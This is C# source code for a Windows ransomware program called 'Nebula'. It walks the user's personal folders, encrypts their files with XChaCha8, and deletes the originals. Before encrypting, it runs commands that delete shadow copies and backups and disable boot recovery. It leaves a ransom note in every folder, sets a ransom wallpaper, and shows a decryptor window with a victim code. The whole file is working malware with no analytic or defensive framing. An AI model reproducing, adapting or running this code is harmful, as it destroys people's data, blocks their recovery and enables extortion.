using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NebulaRun
{

public class Nbl : Form
{
	public const int WM_NCLBUTTONDOWN = 161;

	public const int HTCAPTION = 2;

	private static string[] GetTargetDirs()
	{
		List<string> dirs = new List<string>();
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.Personal); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try
		{
			string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			if (!string.IsNullOrEmpty(userProfile))
			{
				string downloads = Path.Combine(userProfile, "Downloads");
				if (Directory.Exists(downloads)) dirs.Add(downloads);
			}
		}
		catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		try { string d = Environment.GetFolderPath(Environment.SpecialFolder.Favorites); if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) dirs.Add(d); } catch {}
		return dirs.ToArray();
	}

	public static byte[] AESKey;

	public static byte[] AESIV;

	private IContainer components;

	private Label labelTitle;

	private RichTextBox richTextBoxMessage;

	private Label labelContactInfo;

	private Label labelVictimCode;

	private PictureBox pictureBoxNebula;

	private TextBox textBoxDecryptPassword;

	private Button buttonDecrypt;

	private Button buttonClose;

	private NotifyIcon notifyIcon;

	public static string VictimCode { get; private set; }

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	public Nbl()
	{
		InitializeComponent();
		LoadEmbeddedImage();
		((Control)labelVictimCode).Text = VictimCode; /* VICTIM CODE */
		((Control)this).MouseDown += new MouseEventHandler(Nbl_MouseDown);
		((Control)buttonDecrypt).Click += buttonDecrypt_Click;
	}

	private void Nbl_MouseDown(object sender, MouseEventArgs e)
	{
		if ((int)e.Button == 1048576)
		{
			ReleaseCapture();
			SendMessage(((Control)this).Handle, 161, 2, 0);
		}
	}

	private void LoadEmbeddedImage()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] names = new string[] { "NebulaRun.nebula.png", "nebula.png" };
		foreach (string name in names)
		{
			try
			{
				using (Stream stream = executingAssembly.GetManifestResourceStream(name))
				{
					if (stream != null)
					{
						pictureBoxNebula.Image = Image.FromStream(stream);
						return;
					}
				}
			}
			catch
			{
			}
		}
	}

	public static void GenerateVictimCode()
	{
		VictimCode = Guid.NewGuid().ToString().ToUpper();
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct WIN32_FIND_DATAW
	{
		public uint dwFileAttributes;
		public System.Runtime.InteropServices.ComTypes.FILETIME ftCreationTime;
		public System.Runtime.InteropServices.ComTypes.FILETIME ftLastAccessTime;
		public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWriteTime;
		public uint nFileSizeHigh;
		public uint nFileSizeLow;
		public uint dwReserved0;
		public uint dwReserved1;
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string cFileName;
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
		public string cAlternateFileName;
	}
	/* WINAPI FOR FILES */
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr FindFirstFileW(string lpFileName, out WIN32_FIND_DATAW lpFindFileData);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool FindNextFileW(IntPtr hFindFile, out WIN32_FIND_DATAW lpFindFileData);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool FindClose(IntPtr hFindFile);

	private static readonly string[] SystemFolderKeywords = new string[]
	{
		"\\system32",
		"\\syswow64",
		"\\syswow",
		"\\windows",
		"\\winsxs",
		"\\winsxs64",
		"microsoft",
		"windows"
	}; /* KEYWORDS TO IGNORE */

	private static bool IsSystemFolder(string path)
	{
		if (string.IsNullOrEmpty(path)) return true;
		string lower = path.ToLowerInvariant();
		foreach (string keyword in SystemFolderKeywords)
		{
			if (lower.Contains(keyword))
			{
				return true;
			}
		}
		return false;
	}

	private static void DropNote(string dir)
	{
		try
		{
			string notePath = Path.Combine(dir, "README_FOR_DECRYPTION.txt");
			if (!File.Exists(notePath))
			{
				string text = "ATTENTION!\n\nYour important files have been encrypted with military-grade XChaCha8 encryption.\n\nTo decrypt your files, run the Nebula Decryptor application and enter your 32-byte Base64 key.\n\nYour Victim Code is: " + VictimCode;
				File.WriteAllText(notePath, text, Encoding.UTF8);
			}
		}
		catch
		{
		}
	}

	private static List<string> GetFilesFast(string rootDir, bool encryptMode)
	{
		List<string> files = new List<string>();
		Stack<string> stack = new Stack<string>();
		stack.Push(rootDir);

		while (stack.Count > 0)
		{
			string dir = stack.Pop();
			if (IsSystemFolder(dir)) continue;

			if (encryptMode)
			{
				DropNote(dir);
			}

			try
			{
				WIN32_FIND_DATAW findData;
				IntPtr hFind = FindFirstFileW(dir + "\\*", out findData);
				if (hFind != IntPtr.Zero && hFind != new IntPtr(-1))
				{
					do
					{
						string name = findData.cFileName;
						if (name != "." && name != "..")
						{
							string fullPath = Path.Combine(dir, name);
							if (IsSystemFolder(fullPath)) continue;

							if ((findData.dwFileAttributes & 16) != 0)
							{
								stack.Push(fullPath);
							}
							else
							{
								bool isTxt = fullPath.EndsWith(".txt", StringComparison.OrdinalIgnoreCase);
								bool isNbl = fullPath.EndsWith(".nbl", StringComparison.OrdinalIgnoreCase);
								if (encryptMode && !isNbl && !isTxt)
								{
									files.Add(fullPath);
								}
								else if (!encryptMode && isNbl)
								{
									files.Add(fullPath);
								}
							}
						}
					} while (FindNextFileW(hFind, out findData));
					FindClose(hFind);
				}
			}
			catch
			{
			}
		}
		return files;
	}

	public static byte[] XKey;

	private static byte[] DeriveNonceFromKey(byte[] key)
	{
		byte[] nonce = new byte[24];
		using (SHA256 sha256 = SHA256.Create())
		{
			byte[] hash = sha256.ComputeHash(key);
			Buffer.BlockCopy(hash, 0, nonce, 0, 24);
		}
		return nonce;
	}

	private static void PurgeBackups()
	{
		try
		{
			string[] commands = new string[]
			{
				"vssadmin delete shadows /all /quiet",
				"wmic shadowcopy delete",
				"wbadmin delete systemstatebackup -keepVersions:0 -quiet",
				"bcdedit /set {default} recoveryenabled no",
				"bcdedit /set {default} bootstatuspolicy ignoreallfailures"
			};

			foreach (string cmd in commands)
			{
				try
				{
					ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
					{
						CreateNoWindow = true,
						UseShellExecute = false,
						RedirectStandardOutput = true,
						RedirectStandardError = true
					};
					using (Process p = Process.Start(psi))
					{
						p.WaitForExit(5000);
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	private static void SetWallpaper()
	{
		try
		{
			string tempPath = Path.Combine(Path.GetTempPath(), "nebula_wallpaper.bmp");
			using (Bitmap bmp = new Bitmap(1920, 1080))
			{
				using (Graphics g = Graphics.FromImage(bmp))
				{
					g.Clear(Color.Black);
					using (Brush dodgerBrush = new SolidBrush(Color.DodgerBlue))
					using (Font titleFont = new Font("Arial", 48, FontStyle.Bold))
					using (Font bodyFont = new Font("Arial", 24, FontStyle.Regular))
					{
						g.DrawString("YOUR FILES HAVE BEEN ENCRYPTED", titleFont, dodgerBrush, 100, 200);
						g.DrawString("All your important documents, photos, and databases are locked with XChaCha8.", bodyFont, dodgerBrush, 100, 320);
						g.DrawString("Do not attempt to modify or decrypt files with third-party software.", bodyFont, dodgerBrush, 100, 380);
						g.DrawString("Victim Code: " + VictimCode, bodyFont, dodgerBrush, 100, 500);
					}
				}
				bmp.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);
			}

			SystemParametersInfo(20, 0, tempPath, 3);
		}
		catch
		{
		}
	}

	public static void EncryptAll()
	{
		PurgeBackups();
		GenerateVictimCode();
		SetWallpaper();
		byte[] key = new byte[32];
		using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
		{
			rng.GetBytes(key);
		}
		XKey = key;
		byte[] nonce = DeriveNonceFromKey(key);

		List<string> allFiles = new List<string>();
		string[] targetDirs = GetTargetDirs();
		foreach (string root in targetDirs)
		{
			if (!string.IsNullOrEmpty(root) && Directory.Exists(root) && !IsSystemFolder(root))
			{
				allFiles.AddRange(GetFilesFast(root, true));
			}
		}

		Parallel.ForEach(allFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }, filePath =>
		{
			EncryptFile(filePath, key, nonce);
		});
	}

	private static void EncryptFile(string filePath, byte[] key, byte[] nonce)
	{
		try
		{
			byte[] plaintext;
			using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 65536, FileOptions.SequentialScan))
			{
				plaintext = new byte[fs.Length];
				int read = 0;
				while (read < plaintext.Length)
				{
					int n = fs.Read(plaintext, read, plaintext.Length - read);
					if (n == 0) break;
					read += n;
				}
			}

			byte[] ciphertext = new byte[plaintext.Length];
			XChaCha8.Crypt(key, nonce, plaintext, ciphertext);

			using (FileStream fsOut = new FileStream(filePath + ".nbl", FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
			{
				fsOut.Write(ciphertext, 0, ciphertext.Length);
			}
			File.Delete(filePath);
		}
		catch
		{
		}
	}

	public static string GetBase64Key()
	{
		return Convert.ToBase64String(XKey);
	}

	public static string GetBase64IV()
	{
		return "N/A (Key-only mode)";
	}

	private void buttonDecrypt_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBoxDecryptPassword).Text.Trim();
		if (string.IsNullOrWhiteSpace(text))
		{
			MessageBox.Show("Please enter the Base64 key.", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)48);
			return;
		}
		try
		{
			byte[] key;
			try
			{
				key = Convert.FromBase64String(text);
			}
			catch
			{
				MessageBox.Show("Invalid Base64 key format.", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)48);
				return;
			}

			if (key.Length != 32)
			{
				MessageBox.Show("Key must be exactly 32 bytes (Base64 encoded).", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)48);
				return;
			}

			List<string> allFiles = new List<string>();
			string[] targetDirs = GetTargetDirs();
			foreach (string text2 in targetDirs)
			{
				if (!string.IsNullOrEmpty(text2) && Directory.Exists(text2) && !IsSystemFolder(text2))
				{
					allFiles.AddRange(GetFilesFast(text2, false));
				}
			}
			Parallel.ForEach(allFiles, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount * 2 }, filePath =>
			{
				DecryptFile(filePath, key);
			});
			MessageBox.Show("Done", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)64);
			SelfDeleteAndExit();
		}
		catch
		{
			MessageBox.Show("ERROR", "NEBULA", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void SelfDeleteAndExit()
	{
		try
		{
			string exePath = Process.GetCurrentProcess().MainModule.FileName;
			string batPath = Path.Combine(Path.GetTempPath(), "cleanup_" + Guid.NewGuid().ToString("N") + ".bat");
			string batContent = "@echo off\r\n" +
								":loop\r\n" +
								"del \"" + exePath + "\"\r\n" +
								"if exist \"" + exePath + "\" goto loop\r\n" +
								"del \"%~f0\"\r\n";
			File.WriteAllText(batPath, batContent, Encoding.ASCII);
			ProcessStartInfo psi = new ProcessStartInfo(batPath)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			Process.Start(psi);
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	private void buttonClose_Click(object sender, EventArgs e)
	{
		SelfDeleteAndExit();
	}

	private void notifyIcon_DoubleClick(object sender, EventArgs e)
	{
		((Control)this).Show();
		((Form)this).WindowState = (FormWindowState)0;
		((Control)this).BringToFront();
	}

	private static void DecryptFile(string filePath, byte[] key)
	{
		try
		{
			byte[] ciphertext;
			using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 65536, FileOptions.SequentialScan))
			{
				ciphertext = new byte[fs.Length];
				int read = 0;
				while (read < ciphertext.Length)
				{
					int n = fs.Read(ciphertext, read, ciphertext.Length - read);
					if (n == 0) break;
					read += n;
				}
			}

			byte[] nonce = DeriveNonceFromKey(key);
			byte[] plaintext = new byte[ciphertext.Length];
			XChaCha8.Crypt(key, nonce, ciphertext, plaintext);

			string originalPath = filePath.Substring(0, filePath.Length - 4);
			using (FileStream fsOut = new FileStream(originalPath, FileMode.Create, FileAccess.Write, FileShare.None, 65536, FileOptions.WriteThrough))
			{
				fsOut.Write(plaintext, 0, plaintext.Length);
			}
			File.Delete(filePath);
		}
		catch
		{
		}
	}

	private void Nbl_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
			if (notifyIcon != null)
			{
				notifyIcon.Dispose();
			}
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
		labelTitle = new Label();
		richTextBoxMessage = new RichTextBox();
		labelContactInfo = new Label();
		labelVictimCode = new Label();
		pictureBoxNebula = new PictureBox();
		textBoxDecryptPassword = new TextBox();
		buttonDecrypt = new Button();
		buttonClose = new Button();
		notifyIcon = new NotifyIcon(components);
		((ISupportInitialize)pictureBoxNebula).BeginInit();
		((Control)this).SuspendLayout();
		((Control)labelTitle).ForeColor = Color.DodgerBlue;
		((Control)labelTitle).Location = new Point(10, 8);
		((Control)labelTitle).Name = "labelTitle";
		((Control)labelTitle).Size = new Size(200, 24);
		((Control)labelTitle).TabIndex = 0;
		((Control)labelTitle).Text = "Nebula Decryptor";
		((Control)richTextBoxMessage).BackColor = Color.Black;
		((Control)richTextBoxMessage).Font = new Font("Consolas", 10f);
		((Control)richTextBoxMessage).ForeColor = Color.DodgerBlue;
		((Control)richTextBoxMessage).Location = new Point(243, 54);
		((Control)richTextBoxMessage).Margin = new Padding(3, 2, 3, 2);
		((Control)richTextBoxMessage).Name = "richTextBoxMessage";
		((TextBoxBase)richTextBoxMessage).ReadOnly = true;
		richTextBoxMessage.ScrollBars = (RichTextBoxScrollBars)2;
		((Control)richTextBoxMessage).Size = new Size(645, 227);
		((Control)richTextBoxMessage).TabIndex = 1;
		((Control)richTextBoxMessage).Text = "ATTENTION!\n\nYour important files, documents, photos, and databases have been encrypted using military-grade XChaCha8 encryption.\n\nTo decrypt your files, you must enter the correct decryption password.\n\nAttempts to decrypt or modify files using third-party tools will result in permanent data loss.";
       		/* NOTE HERE */
		((Control)labelContactInfo).AutoSize = true;
		((Control)labelContactInfo).Font = new Font("Segoe UI", 12f, (FontStyle)1);
		((Control)labelContactInfo).ForeColor = Color.DodgerBlue;
		((Control)labelContactInfo).Location = new Point(12, 291);
		((Control)labelContactInfo).Name = "labelContactInfo";
		((Control)labelContactInfo).Size = new Size(321, 28);
		((Control)labelContactInfo).TabIndex = 2;
		((Control)labelContactInfo).Text = "Contact: EXAMPLE";
		((Control)labelVictimCode).AutoSize = true;
		((Control)labelVictimCode).Font = new Font("Segoe UI", 12f, (FontStyle)1);
		((Control)labelVictimCode).ForeColor = Color.DodgerBlue;
		((Control)labelVictimCode).Location = new Point(12, 363);
		((Control)labelVictimCode).Name = "labelVictimCode";
		((Control)labelVictimCode).Size = new Size(161, 28);
		((Control)labelVictimCode).TabIndex = 3;
		((Control)labelVictimCode).Text = "---";
		((Control)pictureBoxNebula).Location = new Point(3, 40);
		((Control)pictureBoxNebula).Margin = new Padding(3, 2, 3, 2);
		((Control)pictureBoxNebula).Name = "pictureBoxNebula";
		((Control)pictureBoxNebula).Size = new Size(225, 241);
		pictureBoxNebula.SizeMode = (PictureBoxSizeMode)4;
		pictureBoxNebula.TabIndex = 5;
		pictureBoxNebula.TabStop = false;
		((Control)textBoxDecryptPassword).BackColor = Color.Black;
		((Control)textBoxDecryptPassword).Font = new Font("Segoe UI", 10f);
		((Control)textBoxDecryptPassword).ForeColor = Color.DodgerBlue;
		((Control)textBoxDecryptPassword).Location = new Point(198, 328);
		((Control)textBoxDecryptPassword).Margin = new Padding(3, 2, 3, 2);
		((Control)textBoxDecryptPassword).Name = "textBoxDecryptPassword";
		((Control)textBoxDecryptPassword).Size = new Size(505, 30);
		((Control)textBoxDecryptPassword).TabIndex = 6;
		((Control)buttonDecrypt).BackColor = Color.Black;
		((ButtonBase)buttonDecrypt).FlatStyle = (FlatStyle)0;
		((Control)buttonDecrypt).ForeColor = Color.DodgerBlue;
		((Control)buttonDecrypt).Location = new Point(733, 328);
		((Control)buttonDecrypt).Margin = new Padding(3, 2, 3, 2);
		((Control)buttonDecrypt).Name = "buttonDecrypt";
		((Control)buttonDecrypt).Size = new Size(137, 30);
		((Control)buttonDecrypt).TabIndex = 7;
		((Control)buttonDecrypt).Text = "Decrypt";
		((ButtonBase)buttonDecrypt).UseVisualStyleBackColor = false;
		((Control)buttonDecrypt).Click += buttonDecrypt_Click;
		((Control)buttonClose).Anchor = (AnchorStyles)9;
		((Control)buttonClose).BackColor = Color.Black;
		((ButtonBase)buttonClose).FlatAppearance.BorderSize = 0;
		((ButtonBase)buttonClose).FlatStyle = (FlatStyle)0;
		((Control)buttonClose).ForeColor = Color.Red;
		((Control)buttonClose).Location = new Point(865, 5);
		((Control)buttonClose).Name = "buttonClose";
		((Control)buttonClose).Size = new Size(30, 30);
		((Control)buttonClose).TabIndex = 8;
		((Control)buttonClose).Text = "X";
		((ButtonBase)buttonClose).UseVisualStyleBackColor = false;
		((Control)buttonClose).Click += buttonClose_Click;
		notifyIcon.Icon = SystemIcons.Information;
		notifyIcon.Text = "Nebula Decryptor (hidden)";
		notifyIcon.Visible = true;
		notifyIcon.DoubleClick += notifyIcon_DoubleClick;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(8f, 16f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.Black;
		((Form)this).ClientSize = new Size(900, 400);
		((Control)this).Controls.Add((Control)(object)buttonClose);
		((Control)this).Controls.Add((Control)(object)buttonDecrypt);
		((Control)this).Controls.Add((Control)(object)textBoxDecryptPassword);
		((Control)this).Controls.Add((Control)(object)pictureBoxNebula);
		((Control)this).Controls.Add((Control)(object)labelTitle);
		((Control)this).Controls.Add((Control)(object)richTextBoxMessage);
		((Control)this).Controls.Add((Control)(object)labelContactInfo);
		((Control)this).Controls.Add((Control)(object)labelVictimCode);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Margin = new Padding(3, 2, 3, 2);
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "Nbl";
		((Form)this).StartPosition = (FormStartPosition)1;
		((Form)this).TopMost = true;
		((ISupportInitialize)pictureBoxNebula).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}

}
